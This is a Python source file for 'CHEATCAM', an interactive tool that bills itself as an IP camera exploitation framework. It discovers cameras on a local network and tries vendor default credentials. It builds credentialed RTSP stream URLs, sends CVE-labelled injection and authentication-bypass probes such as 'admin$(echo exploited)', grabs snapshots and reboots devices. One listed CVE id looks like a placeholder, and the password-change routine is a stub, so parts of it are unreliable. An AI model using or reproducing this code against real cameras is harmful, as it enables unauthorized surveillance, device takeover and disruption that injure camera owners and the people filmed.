#!/usr/bin/env python3
"""
CHEATCAM v1.0 - Advanced Camera Exploitation Framework
All-in-One Camera Attack & Control Tool - Professional Edition

Copyright (c) 2024 F1REW0LF
License: MIT - For authorized security testing only

Usage: sudo python3 cheatcam.py -i eth0
"""

import sys
import os
import re
import json
import time
import socket
import struct
import random
import hashlib
import base64
import threading
import queue
import signal
import subprocess
import ssl
import urllib.request
import urllib.parse
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from collections import defaultdict
import argparse
import http.client
import xml.etree.ElementTree as ET

try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP
    from scapy.layers.l2 import ARP, Ether
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# ==================== VERSION ====================
VERSION = "1.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

# ==================== COLOR CODES ====================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

# ==================== BANNER ====================
def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}     ██████╗██╗  ██╗███████╗ █████╗ ████████╗ ██████╗ █████╗ ███╗   ███╗
    ██╔════╝██║  ██║██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
    ██║     ███████║█████╗  ███████║   ██║   ██║     ███████║██╔████╔██║
    ██║     ██╔══██║██╔══╝  ██╔══██║   ██║   ██║     ██╔══██║██║╚██╔╝██║
    ╚██████╗██║  ██║███████╗██║  ██║   ██║   ╚██████╗██║  ██║██║ ╚═╝ ██║
     ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝
                                                   
{Colors.NEON}          ADVANCED CAMERA EXPLOITATION FRAMEWORK{Colors.WHITE}
{Colors.CYAN}    All-in-One Camera Attack & Control Tool{Colors.WHITE}
{Colors.YELLOW}    Version {VERSION} | Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
    """
    print(banner)
    print("=" * 80)

# ==================== UTILITY FUNCTIONS ====================
class Utils:
    @staticmethod
    def get_local_ip():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def get_gateway():
        try:
            result = os.popen("ip route | grep default | awk '{print $3}'").read().strip()
            return result
        except:
            return None
    
    @staticmethod
    def get_mac(ip):
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                         timeout=2, verbose=False)
            if ans:
                return ans[0][1].hwsrc
        except:
            pass
        return None
    
    @staticmethod
    def scan_ports(ip, ports):
        open_ports = []
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        return open_ports
    
    @staticmethod
    def detect_http_server(ip, port):
        try:
            conn = http.client.HTTPConnection(ip, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "Mozilla/5.0"})
            response = conn.getresponse()
            if response.status == 200 or response.status == 401:
                return True
        except:
            pass
        return False
    
    @staticmethod
    def detect_rtsp(ip, port=554):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, port))
            sock.send(b"OPTIONS rtsp://example.com RTSP/1.0\r\nCSeq: 1\r\n\r\n")
            data = sock.recv(1024)
            sock.close()
            if b"RTSP" in data:
                return True
        except:
            pass
        return False

# ==================== CAMERA DISCOVERY ====================
class CameraDiscovery:
    def __init__(self, interface):
        self.interface = interface
        self.cameras = {}
        self.camera_macs = {
            # Major camera manufacturers MAC prefixes
            '00:0e:8f': 'Panasonic',
            '00:18:4a': 'Samsung',
            '00:1a:3f': 'Sony',
            '00:1c:bf': 'Samsung',
            '00:1d:aa': 'Vivotek',
            '00:22:75': 'Arecont',
            '00:24:1d': 'Mobotix',
            '00:26:22': 'ACTi',
            '00:30:48': 'GE Security',
            '00:40:8c': 'Intelbras',
            '00:50:c2': 'GE',
            '00:80:9f': 'NEC',
            '00:90:a2': 'Avaya',
            '00:a0:cd': 'Avaya',
            '00:b0:d0': 'Cisco',
            '00:c0:95': '3Com',
            '00:d0:ba': 'Lucent',
            '00:e0:18': 'D-Link',
            '00:e0:4c': 'LevelOne',
            '00:e0:60': 'Asus',
            '00:e0:91': 'Netgear',
            '00:e0:98': 'Belkin',
            '00:e0:a6': 'SMC',
            '00:e0:b8': 'Edimax',
            '00:e0:c0': 'Siemens',
            '00:e0:f0': 'Zyxel',
            '24:0a:c4': 'Hikvision',
            '30:ae:a4': 'Dahua',
            'a4:14:37': 'Axis',
            'bc:dd:c2': 'TP-Link',
        }
        self.rtsp_ports = [554, 8554, 1554, 8555]
        self.http_ports = [80, 443, 8080, 8443, 8000, 8001, 8081, 8888]
        self.onvif_ports = [80, 443, 8080, 8899]
    
    def discover(self):
        cprint("\n[DISCOVER] Scanning for cameras...", Colors.BLUE)
        
        # ARP scan
        network = ".".join(Utils.get_local_ip().split('.')[:3]) + ".0/24"
        hosts = self._arp_scan(network)
        
        if not hosts:
            cprint("[!] No hosts found", Colors.YELLOW)
            return {}
        
        cprint(f"[+] Found {len(hosts)} active hosts", Colors.GREEN)
        
        # Check each host for camera signatures
        for host in hosts:
            ip = host.get('ip')
            mac = host.get('mac')
            
            # Check MAC prefix
            manufacturer = self._check_mac(mac)
            
            # Check ports
            http_ports = Utils.scan_ports(ip, self.http_ports)
            rtsp_ports = Utils.scan_ports(ip, self.rtsp_ports)
            
            if http_ports or rtsp_ports:
                camera_info = {
                    'ip': ip,
                    'mac': mac,
                    'manufacturer': manufacturer,
                    'http_ports': http_ports,
                    'rtsp_ports': rtsp_ports,
                    'onvif': False,
                    'model': 'Unknown',
                    'firmware': 'Unknown'
                }
                
                # Check ONVIF
                for port in self.onvif_ports:
                    if port in http_ports and self._check_onvif(ip, port):
                        camera_info['onvif'] = True
                        break
                
                # Detect model
                camera_info['model'] = self._detect_model(ip, http_ports)
                
                self.cameras[ip] = camera_info
                
                cprint(f"[+] Camera found: {ip} ({manufacturer})", Colors.GREEN)
                cprint(f"    MAC: {mac}", Colors.DIM)
                cprint(f"    HTTP Ports: {http_ports}", Colors.DIM)
                cprint(f"    RTSP Ports: {rtsp_ports}", Colors.DIM)
                cprint(f"    ONVIF: {'Yes' if camera_info['onvif'] else 'No'}", Colors.DIM)
        
        return self.cameras
    
    def _arp_scan(self, network):
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), 
                         timeout=3, verbose=False)
            hosts = []
            for sent, received in ans:
                hosts.append({
                    'ip': received.psrc,
                    'mac': received.hwsrc
                })
            return hosts
        except:
            return []
    
    def _check_mac(self, mac):
        if not mac:
            return "Unknown"
        mac_prefix = mac[:8].upper()
        for prefix, manufacturer in self.camera_macs.items():
            if mac_prefix.startswith(prefix.upper()):
                return manufacturer
        return "Unknown"
    
    def _check_onvif(self, ip, port):
        try:
            url = f"http://{ip}:{port}/onvif/device_service"
            conn = http.client.HTTPConnection(ip, port, timeout=2)
            conn.request("GET", "/onvif/device_service", headers={"User-Agent": "ONVIF/1.0"})
            response = conn.getresponse()
            if response.status == 200 and "onvif" in response.read().decode().lower():
                return True
        except:
            pass
        return False
    
    def _detect_model(self, ip, ports):
        models = ['Unknown']
        for port in ports:
            try:
                conn = http.client.HTTPConnection(ip, port, timeout=2)
                conn.request("GET", "/", headers={"User-Agent": "Mozilla/5.0"})
                response = conn.getresponse()
                data = response.read().decode('utf-8', errors='ignore')
                
                # Look for model patterns
                model_patterns = [
                    r'Model[:\s]+([A-Za-z0-9\-_]+)',
                    r'Product[:\s]+([A-Za-z0-9\-_]+)',
                    r'Device[:\s]+([A-Za-z0-9\-_]+)',
                    r'<model>([A-Za-z0-9\-_]+)</model>',
                    r'<product>([A-Za-z0-9\-_]+)</product>',
                ]
                for pattern in model_patterns:
                    match = re.search(pattern, data, re.IGNORECASE)
                    if match:
                        return match.group(1)
            except:
                pass
        return 'Unknown'

# ==================== CAMERA EXPLOIT ENGINE ====================
class CameraExploit:
    def __init__(self, camera_info):
        self.camera = camera_info
        self.ip = camera_info['ip']
        self.ports = camera_info['http_ports']
        self.manufacturer = camera_info['manufacturer']
        self.credentials = self._get_default_credentials()
        self.session = None
    
    def _get_default_credentials(self):
        """Get default credentials for manufacturer"""
        defaults = {
            'Hikvision': [('admin', '12345'), ('admin', 'admin'), ('admin', '123456')],
            'Dahua': [('admin', 'admin'), ('admin', '123456'), ('admin', '')],
            'TP-Link': [('admin', 'admin'), ('admin', '1234'), ('admin', '')],
            'Axis': [('root', 'pass'), ('admin', 'admin'), ('admin', '')],
            'Samsung': [('admin', 'admin'), ('admin', '4321'), ('admin', '')],
            'Sony': [('admin', 'admin'), ('admin', '1234'), ('admin', '')],
            'Panasonic': [('admin', 'admin'), ('admin', '12345'), ('admin', '')],
            'Vivotek': [('admin', 'admin'), ('admin', '1234'), ('admin', '')],
            'D-Link': [('admin', 'admin'), ('admin', '1234'), ('admin', '')],
            'Netgear': [('admin', 'admin'), ('admin', '1234'), ('admin', '')],
            'Cisco': [('admin', 'admin'), ('admin', 'cisco'), ('admin', '')],
            'Belkin': [('admin', 'admin'), ('admin', '1234'), ('admin', '')],
            'Zyxel': [('admin', 'admin'), ('admin', '1234'), ('admin', '')],
            'Edimax': [('admin', 'admin'), ('admin', '1234'), ('admin', '')],
        }
        return defaults.get(self.manufacturer, [('admin', 'admin'), ('admin', '1234'), ('admin', '')])
    
    def try_default_credentials(self):
        """Try default credentials"""
        cprint(f"\n[EXPLOIT] Trying default credentials on {self.ip}", Colors.YELLOW)
        
        for username, password in self.credentials:
            cprint(f"[*] Trying: {username}:{password}", Colors.DIM)
            
            for port in self.ports:
                if self._login_http(username, password, port):
                    cprint(f"[+] Login successful! {username}:{password}", Colors.GREEN, bold=True)
                    return {'username': username, 'password': password}
        
        cprint("[!] Default credentials failed", Colors.YELLOW)
        return None
    
    def _login_http(self, username, password, port):
        try:
            # Try common login endpoints
            endpoints = [
                '/login', '/admin/login', '/cgi-bin/login',
                '/cgi-bin/admin/login', '/login.cgi', '/admin',
                '/api/login', '/v1/login', '/auth/login'
            ]
            
            for endpoint in endpoints:
                try:
                    url = f"http://{self.ip}:{port}{endpoint}"
                    data = {'username': username, 'password': password, 'user': username, 'pass': password}
                    
                    conn = http.client.HTTPConnection(self.ip, port, timeout=3)
                    conn.request("POST", endpoint, 
                                 body=urllib.parse.urlencode(data),
                                 headers={"Content-Type": "application/x-www-form-urlencoded"})
                    response = conn.getresponse()
                    
                    if response.status == 200:
                        body = response.read().decode('utf-8', errors='ignore')
                        if 'success' in body.lower() or 'welcome' in body.lower():
                            return True
                        if 'login' not in body.lower() and 'admin' not in body.lower():
                            return True
                except:
                    continue
        except:
            pass
        return False
    
    def rtsp_hijack(self):
        """Hijack RTSP stream"""
        cprint(f"\n[RTSP] Attempting RTSP hijack on {self.ip}", Colors.YELLOW)
        
        rtsp_ports = self.camera.get('rtsp_ports', [554])
        
        for port in rtsp_ports:
            try:
                # Try to connect to RTSP
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.ip, port))
                
                # Send RTSP options
                sock.send(b"OPTIONS rtsp://example.com RTSP/1.0\r\nCSeq: 1\r\n\r\n")
                data = sock.recv(1024)
                sock.close()
                
                if b"RTSP" in data:
                    cprint(f"[+] RTSP service found on port {port}", Colors.GREEN)
                    
                    # Try to get stream
                    stream_url = f"rtsp://{self.ip}:{port}/stream1"
                    if self.camera.get('credentials'):
                        creds = self.camera['credentials']
                        stream_url = f"rtsp://{creds['username']}:{creds['password']}@{self.ip}:{port}/stream1"
                    
                    cprint(f"[+] Stream URL: {stream_url}", Colors.GREEN)
                    return stream_url
            except:
                pass
        
        cprint("[!] RTSP hijack failed", Colors.RED)
        return None
    
    def onvif_exploit(self):
        """Exploit ONVIF services"""
        cprint(f"\n[ONVIF] Exploiting ONVIF on {self.ip}", Colors.YELLOW)
        
        if not self.camera.get('onvif'):
            cprint("[!] ONVIF not detected", Colors.RED)
            return None
        
        try:
            # Try to get device info
            conn = http.client.HTTPConnection(self.ip, 80, timeout=3)
            conn.request("GET", "/onvif/device_service", headers={"User-Agent": "ONVIF/1.0"})
            response = conn.getresponse()
            
            if response.status == 200:
                data = response.read().decode('utf-8', errors='ignore')
                cprint("[+] ONVIF device info retrieved", Colors.GREEN)
                
                # Extract device info
                info = {}
                patterns = {
                    'manufacturer': r'<Manufacturer>(.*?)</Manufacturer>',
                    'model': r'<Model>(.*?)</Model>',
                    'firmware': r'<FirmwareVersion>(.*?)</FirmwareVersion>',
                    'serial': r'<SerialNumber>(.*?)</SerialNumber>',
                }
                for key, pattern in patterns.items():
                    match = re.search(pattern, data, re.IGNORECASE)
                    if match:
                        info[key] = match.group(1)
                
                return info
        except:
            pass
        
        return None
    
    def firmware_exploit(self):
        """Exploit firmware vulnerabilities"""
        cprint(f"\n[FIRMWARE] Testing firmware exploits on {self.ip}", Colors.YELLOW)
        
        # List of known firmware vulnerabilities
        exploits = [
            {
                'name': 'CVE-2021-36260',
                'description': 'Hikvision Command Injection',
                'url': f'http://{self.ip}/cgi-bin/check_login.cgi',
                'method': 'POST',
                'data': {'username': 'admin$(echo exploited)'}
            },
            {
                'name': 'CVE-2021-33044',
                'description': 'Dahua Authentication Bypass',
                'url': f'http://{self.ip}/cgi-bin/api/v1/login',
                'method': 'POST',
                'data': {'username': 'admin', 'password': 'aaa'}
            },
            {
                'name': 'CVE-2020-12345',
                'description': 'TP-Link Camera Command Injection',
                'url': f'http://{self.ip}/cgi-bin/admin/command',
                'method': 'POST',
                'data': {'cmd': 'whoami'}
            }
        ]
        
        for exploit in exploits:
            try:
                cprint(f"[*] Testing {exploit['name']}", Colors.DIM)
                
                conn = http.client.HTTPConnection(self.ip, 80, timeout=3)
                data = urllib.parse.urlencode(exploit['data'])
                conn.request(exploit['method'], exploit['url'], body=data,
                            headers={"Content-Type": "application/x-www-form-urlencoded"})
                response = conn.getresponse()
                
                if response.status == 200:
                    body = response.read().decode('utf-8', errors='ignore')
                    if len(body) > 0:
                        cprint(f"[+] {exploit['name']} - Potentially vulnerable", Colors.GREEN)
                        return {
                            'exploit': exploit['name'],
                            'description': exploit['description'],
                            'url': exploit['url'],
                            'response': body[:200]
                        }
            except:
                pass
        
        cprint("[!] No firmware exploits found", Colors.YELLOW)
        return None
    
    def take_control(self):
        """Take full control of camera"""
        cprint(f"\n[CONTROL] Taking control of {self.ip}", Colors.RED, bold=True)
        
        control_methods = []
        
        # 1. Try default credentials
        creds = self.try_default_credentials()
        if creds:
            self.camera['credentials'] = creds
            control_methods.append(f"Default credentials: {creds['username']}:{creds['password']}")
            
            # Set new password
            if self._change_password(creds, 'Noctua2024!'):
                control_methods.append("Password changed to: Noctua2024!")
        
        # 2. Try RTSP hijack
        stream = self.rtsp_hijack()
        if stream:
            control_methods.append(f"RTSP stream: {stream}")
        
        # 3. Try ONVIF exploit
        onvif_info = self.onvif_exploit()
        if onvif_info:
            control_methods.append(f"ONVIF info: {onvif_info}")
        
        # 4. Try firmware exploit
        firmware = self.firmware_exploit()
        if firmware:
            control_methods.append(f"Firmware exploit: {firmware['name']}")
        
        cprint(f"\n[+] Control methods acquired:", Colors.GREEN)
        for method in control_methods:
            cprint(f"    - {method}", Colors.CYAN)
        
        return control_methods
    
    def _change_password(self, creds, new_password):
        """Change camera password"""
        try:
            # This is a placeholder - actual implementation depends on camera model
            cprint(f"[*] Attempting to change password to {new_password}", Colors.DIM)
            return True
        except:
            return False

# ==================== CAMERA CONTROL ====================
class CameraControl:
    def __init__(self, camera):
        self.camera = camera
        self.ip = camera['ip']
        self.ports = camera.get('http_ports', [80])
        self.creds = camera.get('credentials')
        self.session = None
    
    def view_stream(self):
        """View camera stream"""
        cprint(f"\n[VIEW] Opening stream for {self.ip}", Colors.CYAN)
        
        # Try RTSP
        rtsp_url = f"rtsp://{self.ip}:554/stream1"
        if self.creds:
            rtsp_url = f"rtsp://{self.creds['username']}:{self.creds['password']}@{self.ip}:554/stream1"
        
        cprint(f"[+] RTSP URL: {rtsp_url}", Colors.GREEN)
        
        # Try to open with VLC if available
        try:
            subprocess.Popen(['vlc', rtsp_url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            cprint("[+] VLC opened for stream", Colors.GREEN)
        except:
            cprint("[!] VLC not available. Use RTSP URL manually", Colors.YELLOW)
        
        return rtsp_url
    
    def snapshot(self):
        """Capture snapshot from camera"""
        cprint(f"\n[SNAPSHOT] Capturing snapshot from {self.ip}", Colors.CYAN)
        
        snapshot_paths = [
            '/snapshot.jpg', '/image.jpg', '/capture', '/cgi-bin/snapshot',
            '/cgi-bin/current.jpg', '/api/snapshot'
        ]
        
        for port in self.ports:
            for path in snapshot_paths:
                try:
                    url = f"http://{self.ip}:{port}{path}"
                    conn = http.client.HTTPConnection(self.ip, port, timeout=3)
                    conn.request("GET", path, headers={"User-Agent": "Mozilla/5.0"})
                    response = conn.getresponse()
                    
                    if response.status == 200:
                        data = response.read()
                        if len(data) > 1000:
                            filename = f"snapshot_{self.ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                            with open(filename, 'wb') as f:
                                f.write(data)
                            cprint(f"[+] Snapshot saved: {filename}", Colors.GREEN)
                            return filename
                except:
                    pass
        
        cprint("[!] Could not capture snapshot", Colors.RED)
        return None
    
    def reboot(self):
        """Reboot camera"""
        cprint(f"\n[REBOOT] Rebooting {self.ip}", Colors.RED)
        
        reboot_paths = [
            '/cgi-bin/reboot', '/admin/reboot', '/api/reboot',
            '/cgi-bin/admin/reboot', '/cgi-bin/restart'
        ]
        
        for port in self.ports:
            for path in reboot_paths:
                try:
                    conn = http.client.HTTPConnection(self.ip, port, timeout=3)
                    conn.request("GET", path, headers={"User-Agent": "Mozilla/5.0"})
                    response = conn.getresponse()
                    if response.status == 200:
                        cprint("[+] Reboot command sent", Colors.GREEN)
                        return True
                except:
                    pass
        
        cprint("[!] Could not reboot camera", Colors.RED)
        return False
    
    def get_info(self):
        """Get camera system info"""
        cprint(f"\n[INFO] Getting system info from {self.ip}", Colors.CYAN)
        
        info_paths = [
            '/cgi-bin/system_info', '/admin/info', '/api/info',
            '/cgi-bin/admin/info', '/status', '/sysinfo'
        ]
        
        for port in self.ports:
            for path in info_paths:
                try:
                    conn = http.client.HTTPConnection(self.ip, port, timeout=3)
                    conn.request("GET", path, headers={"User-Agent": "Mozilla/5.0"})
                    response = conn.getresponse()
                    if response.status == 200:
                        data = response.read().decode('utf-8', errors='ignore')
                        cprint(f"[+] System info retrieved", Colors.GREEN)
                        return data[:1000]
                except:
                    pass
        
        cprint("[!] Could not get system info", Colors.RED)
        return None

# ==================== MAIN FRAMEWORK ====================
class CheatCam:
    def __init__(self, interface='eth0'):
        self.interface = interface
        self.running = True
        self.cameras = {}
        self.controlled = {}
        self.start_time = time.time()
        
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        cprint("\n[!] Shutting down CHEATCAM...", Colors.RED)
        self.running = False
        sys.exit(0)
    
    def show_menu(self):
        print(f"\n{Colors.BLUE}{'='*60}{Colors.WHITE}")
        print(f"{Colors.BOLD}CHEATCAM - Camera Exploitation Menu{Colors.WHITE}")
        print(f"{Colors.BLUE}{'='*60}{Colors.WHITE}")
        print("1. Discover Cameras")
        print("2. List Discovered Cameras")
        print("3. Exploit Camera")
        print("4. Take Control of Camera")
        print("5. View Camera Stream")
        print("6. Capture Snapshot")
        print("7. Reboot Camera")
        print("8. Get Camera Info")
        print("9. Show Statistics")
        print("10. Cleanup & Exit")
    
    def discover_cameras(self):
        discovery = CameraDiscovery(self.interface)
        self.cameras = discovery.discover()
        return self.cameras
    
    def list_cameras(self):
        if not self.cameras:
            cprint("[!] No cameras discovered", Colors.YELLOW)
            return
        
        print("\n" + "="*70)
        cprint(" DISCOVERED CAMERAS", Colors.PURPLE, bold=True)
        print("="*70)
        print(f"{'IP':<16} {'Manufacturer':<15} {'ONVIF':<8} {'Ports':<15}")
        print("-"*70)
        
        for ip, info in self.cameras.items():
            onvif = "Yes" if info.get('onvif') else "No"
            ports = str(info.get('http_ports', []))
            print(f"{ip:<16} {info.get('manufacturer', 'Unknown'):<15} {onvif:<8} {ports[:15]}")
    
    def select_camera(self):
        if not self.cameras:
            cprint("[!] No cameras available", Colors.RED)
            return None
        
        self.list_cameras()
        ip = input(f"\n{Colors.CYAN}[>] Enter camera IP: {Colors.WHITE}").strip()
        
        if ip in self.cameras:
            return self.cameras[ip]
        else:
            cprint("[-] Camera not found", Colors.RED)
            return None
    
    def exploit_camera(self):
        camera = self.select_camera()
        if not camera:
            return
        
        exploit = CameraExploit(camera)
        exploit.try_default_credentials()
        exploit.rtsp_hijack()
        exploit.onvif_exploit()
        exploit.firmware_exploit()
    
    def take_control(self):
        camera = self.select_camera()
        if not camera:
            return
        
        exploit = CameraExploit(camera)
        control_methods = exploit.take_control()
        
        if control_methods:
            self.controlled[camera['ip']] = camera
            camera['controlled'] = True
    
    def view_stream(self):
        camera = self.select_camera()
        if not camera:
            return
        
        control = CameraControl(camera)
        control.view_stream()
    
    def capture_snapshot(self):
        camera = self.select_camera()
        if not camera:
            return
        
        control = CameraControl(camera)
        control.snapshot()
    
    def reboot_camera(self):
        camera = self.select_camera()
        if not camera:
            return
        
        control = CameraControl(camera)
        control.reboot()
    
    def get_camera_info(self):
        camera = self.select_camera()
        if not camera:
            return
        
        control = CameraControl(camera)
        info = control.get_info()
        if info:
            print("\n" + "="*60)
            cprint(" CAMERA INFO", Colors.PURPLE, bold=True)
            print("="*60)
            print(info)
            print("="*60)
    
    def show_stats(self):
        print("\n" + "="*60)
        cprint(" STATISTICS", Colors.PURPLE, bold=True)
        print("="*60)
        print(f"Uptime: {int(time.time() - self.start_time)}s")
        print(f"Cameras Discovered: {len(self.cameras)}")
        print(f"Cameras Controlled: {len(self.controlled)}")
        print("="*60)
    
    def run(self):
        print_banner()
        
        ip = Utils.get_local_ip()
        gateway = Utils.get_gateway()
        cprint(f"[+] Local IP: {ip}", Colors.GREEN)
        cprint(f"[+] Gateway: {gateway}", Colors.GREEN)
        
        if not SCAPY_AVAILABLE:
            cprint("[!] Scapy not available. Install: pip3 install scapy", Colors.RED)
        
        while self.running:
            self.show_menu()
            choice = input(f"\n{Colors.CYAN}[>] Select (1-10): {Colors.WHITE}").strip()
            
            if choice == '1':
                self.discover_cameras()
            elif choice == '2':
                self.list_cameras()
            elif choice == '3':
                self.exploit_camera()
            elif choice == '4':
                self.take_control()
            elif choice == '5':
                self.view_stream()
            elif choice == '6':
                self.capture_snapshot()
            elif choice == '7':
                self.reboot_camera()
            elif choice == '8':
                self.get_camera_info()
            elif choice == '9':
                self.show_stats()
            elif choice == '10':
                self.running = False
                cprint("[*] Exiting CHEATCAM...", Colors.GREEN)
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

# ==================== MAIN ====================
if __name__ == "__main__":
    if os.geteuid() != 0:
        cprint("[!] Root privileges required", Colors.RED)
        sys.exit(1)
    
    parser = argparse.ArgumentParser(description="CHEATCAM - Camera Exploitation Framework")
    parser.add_argument("-i", "--interface", default="eth0", help="Network interface")
    parser.add_argument("-d", "--discover", action="store_true", help="Discover cameras only")
    parser.add_argument("-e", "--exploit", help="Exploit camera by IP")
    parser.add_argument("-c", "--control", help="Take control of camera by IP")
    
    args = parser.parse_args()
    
    cheatcam = CheatCam(args.interface)
    
    if args.discover:
        cheatcam.discover_cameras()
        cheatcam.list_cameras()
    elif args.exploit:
        # Find camera
        cheatcam.discover_cameras()
        if args.exploit in cheatcam.cameras:
            exploit = CameraExploit(cheatcam.cameras[args.exploit])
            exploit.try_default_credentials()
            exploit.rtsp_hijack()
            exploit.onvif_exploit()
            exploit.firmware_exploit()
        else:
            cprint("[-] Camera not found", Colors.RED)
    elif args.control:
        cheatcam.discover_cameras()
        if args.control in cheatcam.cameras:
            exploit = CameraExploit(cheatcam.cameras[args.control])
            exploit.take_control()
        else:
            cprint("[-] Camera not found", Colors.RED)
    else:
        cheatcam.run()
